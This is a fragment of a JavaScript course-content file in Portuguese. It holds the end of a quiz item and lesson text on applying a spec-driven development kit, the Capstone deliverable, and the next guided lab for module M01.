            { id: 'd', texto: 'Porque a máquina não consegue ler Markdown.', correta: false, porque: 'não é limitação de formato, é de natureza do critério.' }
          ], tutorDepois: 'Mecanize o possível e declare o resto: nada fica na opinião do executor.' },
        { tipo: 'texto', html:
          '<h3>Depois do checkpoint, e a peça do produto</h3>' +
          '<p><strong>Extensão.</strong> Depois do checkpoint, aplique o kit a uma capability pequena e não confidencial numa fixture descartável: produza intent, requisitos, design, plano, trace e casos negativos. Compare com <code>ProcessStartInfo.ArgumentList</code>, Roslyn Analyzers, build e xUnit sem trocar a linguagem canônica. Uma execução cria baseline; não mede produtividade organizacional.</p>' +
          '<p><strong>Entrega para o Capstone.</strong> <code>docs/spec/</code> completo: contract, kit funcionando, PRD do produto, spec e plan da fatia 1. É a fundação de tudo que os módulos M03 em diante constroem; sem esta peça, o Capstone vira o chat-driven development que este módulo aposentou.</p>' +
          '<p>Próximo passo: o <strong>Laboratório guiado M01</strong> (em <code>M01.html</code>), onde você cria a cópia de trabalho, reconstrói <code>drift.py</code> e executa os gates. Depois, o Checkpoint M01.</p>' },
        { tipo: 'texto', html: '<p class="ta-nota">Fontes técnicas verificadas em 14/08/2026 (JSON Schema 2020-12, Agent Skills, Git worktree, Python subprocess, Spec Kit, NIST SSDF 1.1, SLSA 1.2); reconfirmar documentação de produto, comandos e versões no máximo a cada 90 dias.</p>' },
        { tipo: 'takeaway', html: 'O kit tira "pronto" da <mark>opinião do executor</mark>: contrato, skills, runner e <mark>evidência</mark> na pasta da feature.' }
      ] }
    ]
  });
})();
